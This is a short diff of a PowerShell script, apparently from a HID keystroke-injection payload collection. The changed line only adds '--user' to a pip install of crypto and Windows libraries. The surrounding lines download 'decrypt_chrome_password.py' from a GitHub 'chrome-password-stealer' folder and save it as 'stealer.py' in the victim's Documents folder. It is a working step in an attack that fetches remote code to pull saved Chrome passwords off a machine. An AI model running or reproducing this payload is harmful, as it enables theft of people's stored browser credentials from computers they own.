@@ -2,7 +2,7 @@ cd $env:USERPROFILE\Documents
 
 #$filePath = "$env:LocalAppData\Programs\Python\Python311\python.exe"
 
-py -m pip install pycryptodomex pywin32
+py -m pip install pycryptodomex pywin32 --user
 
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/simen64/Simons-HID-Scripts/main/chrome-password-stealer/decrypt_chrome_password.py -OutFile $Env:USERPROFILE\Documents\stealer.py
 
